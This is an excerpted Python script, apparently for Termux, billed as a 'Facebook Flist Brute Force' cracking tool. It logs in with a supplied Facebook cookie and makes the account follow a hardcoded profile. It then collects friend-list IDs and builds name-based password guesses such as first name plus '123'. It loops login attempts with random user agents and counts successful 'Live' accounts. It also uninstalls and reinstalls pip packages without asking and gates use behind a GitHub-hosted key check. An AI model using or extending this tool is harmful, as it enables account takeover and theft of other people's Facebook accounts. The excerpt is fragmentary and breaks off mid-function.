...
import requests, sys, time, re, random, base64, subprocess, uuidi
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system("clear")
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] wait a moment while installing requests\n")
    os.system("pip install requests")

try:
    import bs4
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] wait a moment while installing bs4\n")
    os.system("pip install bs4")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] wait a moment while installing rich\n")
    os.system("pip install rich")
...
def security():
    try:
        ...
        k3 = ('token.txt')
        key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        key=(f'TOBI-PH-{uid}5X{key1}110E==')#full key
        mysite= requests.get(f'https://github.com/TobiPHcheat/F-7/blob/main/approved.txt').text#approve site
        if key in mysite:
                os.system('clear')
                ACL()
        else:
    	...
    	print("\033[1;32internet connection error\033[1;37m")
...
████████╗ ██████╗ ██████╗ ██╗██████╗ ██╗  ██╗
╚══██╔══╝██╔═══██╗██╔══██╗██║██╔══██╗██║  ██║
   ██║   ██║   ██║██████╔╝██║██████╔╝███████║  \33[37;41m\t Version 0.1 🖕😜🖕\33[0;m   
   ██║   ██║   ██║██╔══██╗██║██╔═══╝ ██╔══██║
   ██║   ╚██████╔╝██████╔╝██║██║     ██║  ██║
   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝
                                            
     {A}[ {H}Script Facebook Flist Brute Force {A}]   
        [{H} Code By TOBIPHCHEAT {A}]{N}   
                              """)
    ...
    def login_cokie(self):
        ...
        try:
            ...
            if 'href="/zero/optin/write/' in str(link):
                print("[+] notice: you are using facebook free mode 🫣")
                ...
                print("\n[!] Ophish Cookie  Checkpoint 😟");time.sleep(2);self.login_cokie()
            elif 'href="/r.php' in str(link):
                print("[!] cookie you entered is invalid");time.sleep(2);self.login_cokie()
            else:
                ...
                print(f"[✓] welcome {nama} the Flist Meta");self.ikuti({"cookie": cok});self.datas(nama, cok)
    ...
    def ubah_bahasa(self, cok):
        try:
            ...
            for x in data.find_all('form',{'method':'post'}):
                if "Philippines" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Philippines"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100015025260282", cookies=cok).text, "html.parser")
    ...
    def menu(self):
        ...
        try:
            ...
            if "mbasic_logout_button" not in link:
                self.hapus()
                print(f"\n[{M}!{N}] Account got checkpint, please sign in with another account.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[!] No connection")
        ...
        print(47*"°")
        print(f" ↪ \033[1;36mMENU CRACKED{N}\n")
        print(f' ᄂ {H}1\033[1;34m Start cracking Flist Publik   ↪ {H}ON{N} ')
        print(f' ᄂ {H}2\033[1;34m Start File cracking           ↪ {H}ON{N} ')
        print(f' ᄂ {H}3\033[1;37m Start Cloning Email           ↪ {M}OFF{N} ')
        print(f' ᄂ {H}4\033[1;37m Start File Cloning            ↪ {M}OFF{N} ')
        ###print(f' ᄂ {H}6{A} Check Dectector  ↪ {H}ON{N} ')
        print(f' ᄂ {H}E{A} {M}Exit and REMOVE COOKIE {N} ')
        anjay = input(' ᄂ Choose option : ')
        print(47*"-")
        if anjay in ["", " "]:
            print("[!] Huwag walang laman!");time.sleep(2);self.menu()
        elif anjay in ["1", "01"]:
            print("[+] i-type ang 'me' kung gusto mong mag-crack mula sa iyong mga kaibigan...")
            user = input(f"[{O}*{N}] enter id or username : ")
            if "me" in user:
                try:
                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
                    if "Ikaw ay Pansamantalang Naka-block" in link:
                        print("[!] Nililimitahan ng facebook ang bawat aktibidad, limitahan bro, pakilipat ang account");time.sleep(2);self.menu()
                    else:
                ...
                try:
                    ...
                    if "Page not found" in link:
                        print(f"[!] user with {user} not found");time.sleep(2);self.menu()
                    elif "You are Temporarily Blocked" in link:
                        print("[!] facebook limits every activity, limit bro, please switch accounts");time.sleep(2);self.menu()
        ...
        else:print("[!] really good input");time.sleep(2);self.menu()
...
#-------------- DUMP ID -------------------
    ...
    def batur(self, link, coki):
        ...
        try:
            ...
            for softek in memek:
                ...
                sys.stdout.write(f"\r[+] Your collecting {str(len(self.id))} id..");sys.stdout.flush()
    ...
    def metode(self):
        ...
        print(47*"•")
        print('\t   ⟼ %s1%s  \033[1;34m Method B-Graph%s [ON]'%(H,A,N))
        print('\t   ⟼ %s2%s  \033[1;37m Method Regular%s'%(H,A,N))
        print('\t   ⟼ %s3%s  \033[1;37m Method Validate%s'%(H,A,N))
        hc = input('Choice : ')
        if hc in ['1','01']:
            self.paswww("api")
        elif hc in ['2','02']:
    ...
    def paswww(self, xx):
        print(47*"•")
        print('\n\t    %s➛ %s1%s \033[1;37m manual password%s'%(N,H,A,N))
        print('\t    %s➛ %s2%s \033[1;37m bundle password%s'%(N,H,A,N))
        print('\t    %s➛ %s3%s \033[1;34m automatic password%s [ON]'%(N,H,A,N))
        ykh = input('Method : ')
        if ykh in ["", " "]:
            print("[!] huwag walang laman");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            ...
            print('Dapat na hindi bababa sa 6 na character ang haba ng password, gumamit ng "," (kuwit) para sa mga sumusunod na password\n')
            kata = input(f"[{M}?{N}] me: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"say me in addition -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] really good input");time.sleep(2);self.paswww()
    ...
    def manual(self, xx):
        ...
        pwek = input(f"[{O}?{N}] me : ")
        if pwek in[""," "]:
            print(f"[{M}×{N}] wag mong alisan ng laman ang password bro")
        elif len(pwek)<=5:
            print(f"[{M}×{N}] password ng hindi bababa sa 6 na character")
        else:
            if "api" in xx:
                ...
                try:
                    if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                            ...
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"1234", depan[0]+"12345"]
                    else:
                        pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"1234", depan[0]+"12345"]
                    if "iya" in self.iya:
                        for x in self.pasw:
    ...
    def asycn(self, username, pasw, kntd):
        sys.stdout.write(f'\r\r\033[1;37m [{H}Regular{N}] %s|\033[1;32mLive:-%s \033[1;37m'%(self.loop,len(self.ok)));sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uas=random.choice(ugent)
